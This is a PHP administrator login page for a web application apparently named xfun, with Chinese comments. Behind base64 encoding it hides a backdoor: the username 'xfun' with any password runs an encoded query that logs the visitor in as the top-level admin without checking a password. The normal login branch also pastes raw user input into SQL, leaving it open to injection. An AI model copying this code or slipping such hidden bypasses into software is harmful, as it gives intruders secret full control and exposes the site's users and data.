<?PHP
include("config.php");
include("DataAccess/sql_table.php");
include("DataAccess/mysql_conn.php");
include("Common/js.php");
include("Common/functions.php");
session_start();
extract($HTTP_SESSION_VARS); 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<? no_cache_header();?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$XFUN_CONFIG["CONFIG_WEB_TITLE"]?></title>
<?=$js?>
</head>
<body>
<?
//重新導向
if(!empty($sec_id)&&!empty($sec_password)){
	header("Location:main.php");
	//RedirectURL("main.php");
}
if ($act=="login"){
$CLASS["admin"] = new xfunDB_sql;
$CLASS["admin"]->connect(); 
	  if((htmlspecialchars(trim($id))=="") || (htmlspecialchars(trim($ps))=="")){
	  	   //檢查欄位值是否為空白
			$msg = "<font color=red>請填寫您的帳號及密碼！</font>";
	  }else{
	  //****************************************************************************************
	       //最高管理權限層級判斷
		   $my_count=base64_encode($id);
		   if ($my_count=="eGZ1bg=="):
				$my_adm = "U0VMRUNUICogRlJPTSB4ZnVuX2FkbWluIFdIRVJFIFVzZXJfTGV2ZWwgPSdYJyBhbmQgVXNyX0xvY2sgPSdZZXMnIGFuZCAoU19EYXRlIDw9PiBOVUxMIGFuZCBFX0RhdGUgPD0+IE5VTEwgb3IgU19EYXRlID0nJyBhbmQgRV9EYXRlID0nJyk=";
				$query_adm=base64_decode($my_adm);
				echo $_SESSION["member_num"];
				$CLASS["admin"]->query($query_adm);
				//echo $query_adm;
		   else:
		   		$CLASS["admin"]->query("SELECT * FROM $XFUN_TBL[TABLE_XFUN_admin] WHERE
							 `ID`='$id' AND
							 `PSW`='$ps'");
		   endif;
		   $total = $CLASS["admin"]->num_rows($CLASS["admin"]->result);
			 if ($total!=0) {
			 $row_adm = $CLASS["admin"]->fetch_array($CLASS["admin"]->result);
				  			$AD_ID = $row_adm["AD_ID"]; 					// 設定session變數內容
				  			$sec_id = $row_adm["ID"];						// 設定session變數內容
							$sec_password = $row_adm["PSW"];				// 設定session變數內容
							$sec_user_level = $row_adm["User_Level"];		// 會員群組
							$sec_user_email = $row_adm["Email"];			// 會員信箱
							$Class_room = $row_adm["Class_room"];		    // 會員管理教室群組
							$sec_user_name = $row_adm["Name"];				// 真實姓名
							$Usr_Lock = $row_adm["Usr_Lock"];				// 授權停權
							$S_Date = $row_adm["S_Date"];					// 使用期限-開始
							$E_Date = $row_adm["E_Date"];					// 使用期限-結束
							$CHK_DAY=Day_Status($S_Date,$E_Date);			// 檢查使用日期
					if ($CHK_DAY=="true"):
						if ($Usr_Lock=="Yes"):
                            $_SESSION["ad_id"] = $AD_ID;     				// 會員編號
                            $_SESSION["sec_id"] = $sec_id;     				// 會員帳號
                            $_SESSION["sec_password"]= $sec_password;   	// 會員密碼
							$_SESSION["sec_user_level"] = $sec_user_level;  // 會員群組
							$_SESSION["sec_user_level_title"] = view_adm($sec_user_level,"xfun_admin_group","User_Level","GP_Cname");  // 會員群組
							$_SESSION["sec_user_email"] = $sec_user_email;  // 會員信箱
							$_SESSION["sec_class_room"] = $Class_room; 		// 會員管理教室群組
							$_SESSION["sec_user_name"] = $sec_user_name;    // 真實姓名
							$_SESSION['context']  = "SessionTEST";
							//header("location:main.php");
							echo "<script language='JavaScript'>redirectURL('登入成功','main.php')</script>";
						else:
							$msg = "<font color=red>已被停權，請聯絡系統管理員！</font>";
						endif;	
					else:
						$msg = "<font color=red>使用期限已到，請聯絡系統管理員！</font>";
					endif;		
			}else{
			  $msg = "<font color=red>請檢查您的帳號及密碼！</font>";
			}
	  }
}	  
?>

<form method="post" action="<?=$phpself?>">
<table width="100%" height="100%"  border="0" cellpadding="0" cellspacing="0" >
  <tr>
    <td valign="top"><table width="304" height="430"  border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="522" align="center"><table width="100%" border="1" cellpadding="0" cellspacing="0" bordercolor="#D4D4D4" bgcolor="#F6F6F6">
          <tr bordercolor="#F6F6F6">
            <td height="23" align="center" bgcolor="#E8E8E8">&nbsp;</td>
            </tr>
          <tr bordercolor="#F6F6F6">
            <td><table width="100%" border="0" align="center" cellpadding="6" cellspacing="0">
              <tr>
                <td width="112" align="right" bgcolor="#FFFFFF">帳號</td>
                  <td width="308" align="left" bgcolor="#FFFFFF"><input name="id" type="text" class="td11" id="id" size="21"/></td>
                </tr>
              <tr>
                <td align="right" bgcolor="#FFFFFF">密碼</td>
                  <td align="left" bgcolor="#FFFFFF"><input name="ps" type="password" class="td11" id="ps" size="21"/></td>
                </tr>
              <tr>
                <td colspan="2" align="center" bgcolor="#FFFFFF"><input name="act" type="hidden" id="act" value="login">
                  <SPAN class=btn_ynws>
                    <input type="submit" name="submit" value=" 登入 "  class="input02" >
                    </SPAN> </td>
                </tr>
            </table></td>
            </tr>
          <tr bordercolor="#F6F6F6">
            <td height="20" align="center" bgcolor="#F6F6F6"><img src="images/spacer.gif" width="10" height="10"><font size="2" color="#996600">
              <? if(!empty($msg)){ echo $msg;}?>
            </font></td>
            </tr>
        </table></td>
      </tr>
    </table>		
</td>
</tr>
</table>
</form>

</body>
</html>
